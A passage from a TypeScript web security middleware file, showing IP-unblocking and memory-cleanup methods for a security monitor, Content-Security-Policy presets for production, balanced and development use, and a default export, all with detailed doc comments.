      timestamp: new Date().toISOString(),
    };
  }

  /**
   * Manually unblock an IP address
   *
   * USE CASES:
   * - False positive (legitimate user blocked)
   * - User appeals block
   * - Administrative override
   * - Testing/debugging
   *
   * ACTIONS:
   * 1. Remove from blocked list
   * 2. Clear suspicious activity count
   * 3. Log the unblock action
   *
   * @public
   * @static
   * @param {string} ip - IP address to unblock
   * @returns {void}
   *
   * @example
   * ```typescript
   * // Admin endpoint
   * router.post('/admin/unblock-ip', async (ctx) => {
   *   const { ip } = await ctx.request.body();
   *   SecurityMonitor.unblockIP(ip);
   *   ctx.response.body = { success: true };
   * });
   * ```
   */
  static unblockIP(ip: string): void {
    // Remove from blocked set
    this.blockedIPs.delete(ip);

    // Clear suspicious activity count
    this.suspiciousActivity.delete(ip);

    // Log the action
    console.log(`🔓 IP ${ip} has been unblocked`);
  }

  /**
   * Clean up old security data
   *
   * CLEANUP STRATEGY:
   * -----------------
   * When suspicious IP count exceeds 1000:
   * 1. Sort all IPs by incident count
   * 2. Keep top 500 most suspicious
   * 3. Discard the rest
   *
   * WHY CLEANUP?
   * - Prevents unbounded memory growth
   * - Keeps most relevant data
   * - Typical production systems see thousands of unique IPs
   * - Memory footprint stays under 50KB
   *
   * WHEN TO CALL?
   * - Periodic timer (every hour)
   * - After processing X requests
   * - When memory pressure detected
   *
   * PRODUCTION CONSIDERATIONS:
   * - Could use time-based cleanup (remove entries >24h old)
   * - Could persist to database
   * - Could use Redis for distributed systems
   *
   * @public
   * @static
   * @returns {void}
   *
   * @example
   * ```typescript
   * // Periodic cleanup (every hour)
   * setInterval(() => {
   *   SecurityMonitor.cleanup();
   * }, 60 * 60 * 1000);
   *
   * // Or after processing requests
   * let requestCount = 0;
   * app.use(async (ctx, next) => {
   *   requestCount++;
   *   if (requestCount % 10000 === 0) {
   *     SecurityMonitor.cleanup();
   *   }
   *   await next();
   * });
   * ```
   */
  static cleanup(): void {
    // Check if cleanup needed
    if (this.suspiciousActivity.size > 1000) {
      // Sort by incident count (descending)
      const sorted = Array.from(this.suspiciousActivity.entries())
        .sort(([, a], [, b]) => b - a) // Higher counts first
        .slice(0, 500); // Keep top 500

      // Clear existing map
      this.suspiciousActivity.clear();

      // Re-populate with top 500
      sorted.forEach(([ip, count]) => this.suspiciousActivity.set(ip, count));

      console.log(
        "🧹 Security data cleanup completed: Kept top 500 suspicious IPs",
      );
    }
  }
}

// ================================================================================
// 🔧 SECURITY CONFIGURATION PRESETS
// ================================================================================

/**
 * Pre-configured security setups for common scenarios
 *
 * PHILOSOPHY:
 * - Convention over configuration
 * - Safe defaults for each environment
 * - Easy to customize after selecting preset
 *
 * AVAILABLE PRESETS:
 * - MAXIMUM_SECURITY: Strictest, production-ready
 * - BALANCED: Good security with flexibility
 * - DEVELOPMENT: Relaxed for debugging
 *
 * @example
 * ```typescript
 * // Use as-is
 * app.use(createSecurityMiddleware({
 *   environment: 'production',
 *   ...SecurityPresets.BALANCED
 * }));
 *
 * // Customize after selection
 * const config = {
 *   environment: 'production',
 *   ...SecurityPresets.MAXIMUM_SECURITY,
 *   // Override specific settings
 *   frameOptions: 'SAMEORIGIN'
 * };
 * app.use(createSecurityMiddleware(config));
 * ```
 */
export const SecurityPresets = {
  /**
   * Maximum security configuration
   *
   * USE CASE:
   * - Handling sensitive data (financial, health, personal)
   * - High-security requirements
   * - Compliance needs (PCI-DSS, HIPAA)
   *
   * CHARACTERISTICS:
   * - Strictest CSP
   * - HSTS enabled
   * - No framing allowed
   * - Minimal external resources
   *
   * TRADE-OFFS:
   * - May break some third-party integrations
   * - Requires careful testing
   * - More maintenance
   */
  MAXIMUM_SECURITY: {
    enableHSTS: true,
    frameOptions: "DENY" as const,
    enableNoSniff: true,
    enableXSSProtection: true,
    referrerPolicy: "no-referrer",
    contentSecurityPolicy: [
      "default-src 'self'", // Only load from same origin
      "script-src 'self' 'unsafe-inline'", // Scripts from self only (inline for compatibility)
      "style-src 'self' 'unsafe-inline'", // Styles from self only
      "img-src 'self' data:", // Images from self or data URIs
      "font-src 'self'", // Fonts from self only
      "connect-src 'self'", // AJAX to self only
      "media-src 'none'", // No audio/video
      "object-src 'none'", // No plugins
      "child-src 'none'", // No frames
      "frame-src 'none'", // No frames
      "worker-src 'none'", // No web workers
      "frame-ancestors 'none'", // Can't be framed
      "form-action 'self'", // Forms to self only
      "base-uri 'self'", // Restrict <base> tag
      "manifest-src 'self'", // PWA manifest from self
      "upgrade-insecure-requests", // Force HTTPS
    ].join("; "),
  },

  /**
   * Balanced security configuration
   *
   * USE CASE:
   * - Most production applications
   * - Good security without being overly restrictive
   * - Allows common third-party services
   *
   * CHARACTERISTICS:
   * - HSTS enabled
   * - Allows CDNs and Google Fonts
   * - Same-origin framing allowed
   * - Balanced referrer policy
   *
   * RECOMMENDED FOR:
   * - E-commerce sites
   * - SaaS applications
   * - Content management systems
   */
  BALANCED: {
    enableHSTS: true,
    frameOptions: "SAMEORIGIN" as const,
    enableNoSniff: true,
    enableXSSProtection: true,
    referrerPolicy: "strict-origin-when-cross-origin",
    contentSecurityPolicy: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.skypack.dev",
      "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
      "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com data:",
      "img-src 'self' data: https:",
      "media-src 'self' data:",
      "connect-src 'self'",
      "object-src 'none'",
      "frame-ancestors 'self'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join("; "),
  },

  /**
   * Development-friendly configuration
   *
   * USE CASE:
   * - Local development
   * - Debugging and testing
   * - Prototype development
   *
   * CHARACTERISTICS:
   * - No HSTS (allows HTTP)
   * - Allows unsafe-eval (for HMR)
   * - Allows websockets
   * - Allows localhost connections
   *
   * WARNINGS:
   * - Never use in production
   * - Allows potentially unsafe practices
   * - Reduced security for convenience
   */
  DEVELOPMENT: {
    enableHSTS: false,
    frameOptions: "SAMEORIGIN" as const,
    enableNoSniff: true,
    enableXSSProtection: true,
    referrerPolicy: "origin-when-cross-origin",
    contentSecurityPolicy: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval' https:", // Allow eval for dev tools
      "style-src 'self' 'unsafe-inline' https:",
      "font-src 'self' https: data:",
      "img-src 'self' data: https: blob:",
      "media-src 'self' data: https:",
      "connect-src 'self' ws: wss: https: http://localhost:* http://127.0.0.1:*", // Websockets + localhost
      "object-src 'none'",
      "base-uri 'self'",
    ].join("; "),
  },
};

// ================================================================================
// 🚀 EXPORT ALL SECURITY COMPONENTS
// ================================================================================

/**
 * Default export for convenient importing
 *
 * @example
 * ```typescript
 * import security from "./middleware/security.ts";
 *
 * // Use middleware
 * app.use(security.createSecurityMiddleware(config));
 *
 * // Use validator
 * const isValid = security.SecurityValidator.isValidUrl(url);
 *
 * // Use monitor
 * const stats = security.SecurityMonitor.getSecurityStats();
 *
 * // Use presets
 * const config = {
 *   environment: 'production',
 *   ...security.SecurityPresets.BALANCED
 * };
 * ```
 */
export default {
  createSecurityMiddleware,
  SecurityValidator,
  SecurityMonitor,
  SecurityPresets,
};

// ================================================================================
// END OF FILE
// ================================================================================
